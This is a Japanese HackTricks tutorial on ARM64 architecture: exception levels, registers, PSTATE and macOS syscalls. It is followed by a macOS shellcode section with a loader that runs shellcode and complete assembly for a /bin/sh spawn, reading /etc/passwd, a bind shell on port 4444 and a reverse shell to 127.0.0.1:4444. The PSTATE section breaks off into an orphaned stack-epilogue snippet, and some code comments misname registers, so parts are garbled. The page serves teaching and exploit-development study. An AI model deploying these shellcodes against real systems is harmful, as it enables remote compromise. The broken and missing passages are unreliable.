# ARM64v8への導入

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>

## **例外レベル - EL (ARM64v8)**

ARMv8アーキテクチャでは、実行レベルは例外レベル（EL）として知られ、実行環境の特権レベルと能力を定義します。EL0からEL3までの4つの例外レベルがあり、それぞれ異なる目的を果たします：

1. **EL0 - ユーザーモード**：
* これは最も権限の低いレベルで、通常のアプリケーションコードの実行に使用されます。
* EL0で実行されるアプリケーションは、互いにおよびシステムソフトウェアから隔離され、セキュリティと安定性が向上します。
2. **EL1 - オペレーティングシステムカーネルモード**：
* ほとんどのオペレーティングシステムカーネルはこのレベルで実行されます。
* EL1はEL0よりも多くの権限を持ち、システムリソースにアクセスできますが、システムの整合性を保つためにいくつかの制限があります。
3. **EL2 - ハイパーバイザーモード**：
* このレベルは仮想化に使用されます。EL2で実行されるハイパーバイザーは、同じ物理ハードウェア上で実行される複数のオペレーティングシステム（それぞれが独自のEL1で）を管理できます。
* EL2は仮想化環境の隔離と制御のための機能を提供します。
4. **EL3 - セキュアモニターモード**：
* これは最も権限の高いレベルで、セキュアブートや信頼された実行環境によく使用されます。
* EL3はセキュアおよび非セキュア状態（セキュアブート、信頼されたOSなど）間のアクセスを管理および制御できます。

これらのレベルの使用により、ユーザーアプリケーションから最も権限のあるシステムソフトウェアまで、システムの異なる側面を構造化された安全な方法で管理することができます。ARMv8の特権レベルへのアプローチは、異なるシステムコンポーネントを効果的に隔離するのに役立ち、システムのセキュリティと堅牢性を向上させます。

## **レジスタ (ARM64v8)**

ARM64には**31個の汎用レジスタ**があり、`x0`から`x30`までラベル付けされています。それぞれが**64ビット**（8バイト）の値を格納できます。32ビットの値のみが必要な操作の場合、同じレジスタは32ビットモードで`w0`から`w30`としてアクセスできます。

1. **`x0`** から **`x7`** - これらは通常、スクラッチレジスタとして使用され、サブルーチンへのパラメータ渡しに使用されます。
* **`x0`** は関数の戻り値も運びます
2. **`x8`** - Linuxカーネルでは、`x8`は`svc`命令のシステムコール番号として使用されます。**macOSではx16が使用されます！**
3. **`x9`** から **`x15`** - さらに一時的なレジスタで、しばしばローカル変数に使用されます。
4. **`x16`** と **`x17`** - **手続き内呼び出しレジスタ**。即値の一時的なレジスタです。間接関数呼び出しやPLT（手続きリンケージテーブル）スタブにも使用されます。
* **`x16`** は**macOS**で**`svc`**命令の**システムコール番号**として使用されます。
5. **`x18`** - **プラットフォームレジスタ**。汎用レジスタとして使用できますが、このレジスタはプラットフォーム固有の用途に予約されている場合があります：Windowsでは現在のスレッド環境ブロックへのポインタ、またはLinuxカーネルで現在**実行中のタスク構造**を指すために使用されます。
6. **`x19`** から **`x28`** - これらは呼び出し元が保存するレジスタです。関数はこれらのレジスタの値を呼び出し元のために保存する必要があるため、スタックに格納され、呼び出し元に戻る前に回復されます。
7. **`x29`** - **フレームポインタ**はスタックフレームを追跡するために使用されます。関数が呼び出されるために新しいスタックフレームが作成されると、**`x29`**レジスタは**スタックに格納され**、**新しい**フレームポインタアドレス（**`sp`**アドレス）が**このレジストリに格納されます**。
* このレジスタは**汎用レジストリ**としても使用できますが、通常は**ローカル変数**への参照として使用されます。
8. **`x30`** または **`lr`**- **リンクレジスタ**。`BL`（リンク付き分岐）または`BLR`（レジスタへのリンク付き分岐）命令が実行されると、このレジスタに**`pc`**値が格納されることで、**戻りアドレス**を保持します。
* 他のレジスタと同様に使用することもできます。
9. **`sp`** - **スタックポインタ**は、スタックの先頭を追跡するために使用されます。
* **`sp`**の値は常に少なくとも**クワッドワード**の**アライメント**を保つ必要があります。そうでないとアライメント例外が発生する可能性があります。
10. **`pc`** - **プログラムカウンタ**は、現在の命令を指します。このレジスタは例外生成、例外リターン、および分岐によってのみ更新できます。このレジスタを読むことができる唯一の通常の命令は、リンクレジスタ（`BL`、`BLR`）に**`pc`**アドレスを格納するリンク付き分岐命令です。
11. **`xzr`** - **ゼロレジスタ**。32ビットレジスタ形式では**`wzr`**とも呼ばれます。ゼロ値を簡単に取得するため（一般的な操作）や、**`subs`**を使用した比較を行うために使用できます。例：**`subs XZR, Xn, #10`** 結果をどこにも格納せず（**`xzr`**に）。

**`Wn`**レジスタは**`Xn`**レジスタの**32ビット**バージョンです。

### SIMDおよび浮動小数点レジスタ

さらに、最適化された単一命令複数データ（SIMD）操作および浮動小数点算術の実行に使用できる**128ビット長の別の32レジスタ**があります。これらはVnレジスタと呼ばれますが、**64**ビット、**32**ビット、**16**ビット、**8**ビットでも動作し、それぞれ**`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**、**`Bn`**と呼ばれます。

### システムレジスタ

**数百のシステムレジスタ**があります。これらは特別な目的のレジスタ（SPR）とも呼ばれ、**プロセッサ**の動作を**監視**および**制御**するために使用されます。\
専用の特別な命令**`mrs`**および**`msr`**を使用してのみ読み取りまたは設定できます。

リバースエンジニアリングを行う際によく使用される特別なレジスタ**`TPIDR_EL0`**および**`TPIDDR_EL0`**があります。`EL0`接尾辞は、レジスタにアクセスできる**最小の例外**を示します（この場合、EL0は通常のプログラムが実行される通常の例外（特権）レベルです）。\
これらはしばしば、メモリのスレッドローカルストレージ領域の**ベースアドレス**を格納するために使用されます。通常、最初のものはEL0で実行されるプログラムによって読み書き可能ですが、2番目のものはEL0から読み取り可能で、EL1（カーネルなど）から書き込み可能です。

* `mrs x0, TPIDR_EL0 ; TPIDR_EL0をx0に読み込む`
* `msr TPIDR_EL0, X0 ; TPIDR_EL0をx1に書き込む`

### **PSTATE**

**PSTATE**は、オペレーティングシステムに表示される**`SPSR_ELx`**特別なレジスタにシリアル化されたいくつかのコンポーネントです。これらはアクセス可能なフィールドです：

* **`N`**、**`Z`**、**`C`**、および**`V`**条件フラグ：
* **`N`**は操作が負の結果をもたらしたことを意味します
* **`Z`**は操作がゼロをもたらしたことを意味します
* **`C`**は操作がキャリーしたことを意味します
* **`V`**は操作が符号付きオーバーフローをもたらしたことを意味します：
* 2つの正の数の合計が負の結果をもたらします。
* 2つの負の数の合計が正の結果をもたらします。
* 減算では、大きな負の数から小さな正の数（またはその逆）を引くと、結果が与えられたビットサイズの範囲内で表現できない場合です。
* 現在の**レジスタ幅（`nRW`）フラグ**：フラグが0の値を保持している場合、プログラムは再開されるとAArch64実行状態で実行されます。
* 現在の**例外レベル**（**`EL`**）：EL0で実行される通常のプログラムは値が0になります
* **シングルステッピング**フラグ（**`SS`**）：デバッガーは例外を通じて**`SPSR_ELx`**内のSSフラグを1に設定することでシングルステップを使用します。プログラムはステップを実行し、シングルステップ例外を発行します。
* **違法な例外**状態フラグ（**`IL`**）：特権ソフトウェアが無効な例外レベル転送を実行すると、このフラグは1に設定され、プロセッサは違法な状態例外をトリガーします。
* **`DAIF`**フラグ：これらのフラグにより、特権プログラムは特定の外部例外を選択的にマスクできます。
* **スタックポインタ選択**フラグ（**`SPS`**）：EL1以上で実行される特権プログラムは、自分のスタックポインタレジスタとユーザーモデルのもの（例：`SP_EL1`と`EL0`の間）を切り替えることができます。この切り替えは、**`SPSel`**特別なレジスタに書き込むことで実行されます
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **リターン**: `ret`（リンクレジスタにあるアドレスを使用して呼び出し元に制御を返します）

## AARCH32 実行状態

Armv8-Aは32ビットプログラムの実行をサポートしています。**AArch32**は**`A32`**と**`T32`**の**2つの命令セット**で実行でき、**`インターワーキング`**を介してこれらの間を切り替えることができます。\
**特権**を持つ64ビットプログラムは、より低い特権の32ビットに例外レベル転送を実行することで、**32ビットプログラムの実行をスケジュール**できます。\
64ビットから32ビットへの遷移は、例外レベルの低下とともに発生します（例えば、EL1の64ビットプログラムがEL0のプログラムをトリガーする場合）。これは、**`AArch32`**プロセススレッドが実行準備ができたときに特別レジスタ**`SPSR_ELx`**の**ビット4を1に設定**し、`SPSR_ELx`の残りが**`AArch32`**プログラムのCPSRを格納することで行われます。その後、特権プロセスは**`ERET`**命令を呼び出し、プロセッサはCPSRに応じてA32またはT32に入る**`AArch32`**に遷移します。**

## macOS

### BSD システムコール

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)を確認してください。BSDシステムコールは**x16 > 0**になります。

### Mach トラップ

[**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html)を確認してください。Machトラップは**x16 < 0**になるので、前のリストから**マイナス**を付けて番号を呼び出す必要があります：**`_kernelrpc_mach_vm_allocate_trap`**は**`-10`**です。

また、これら（およびBSD）のシステムコールを呼び出す方法を見つけるために、ディスアセンブラで**`libsystem_kernel.dylib`**を確認することもできます：
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
時には、いくつかのシステムコール（BSDおよびMach）のコードがスクリプトを介して生成されるため（ソースコードのコメントを確認）、**ソースコード**を確認するよりも、**`libsystem_kernel.dylib`** の**デコンパイルされた**コードを確認する方が簡単です。dylibでは、実際に呼び出されている内容を見つけることができます。
{% endhint %}

### シェルコード

コンパイルするには：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
バイトを抽出するには：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Cコードでシェルコードをテストする</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### シェル

[**こちら**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)から取得し、説明します。

{% tabs %}
{% tab title="adrを使用" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="スタックを使用" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### catコマンドの実行

目標は`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することです。従って、第二引数(x1)はパラメータの配列（メモリ上ではアドレスのスタックを意味します）です。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### forkを使用してshからコマンドを呼び出し、メインプロセスが終了しないようにする
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### バインドシェル

ポート4444でのバインドシェルは[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)からです。
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### リバースシェル

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) から、**127.0.0.1:4444** へのrevshell
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* あなたの**会社をHackTricksに広告掲載したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
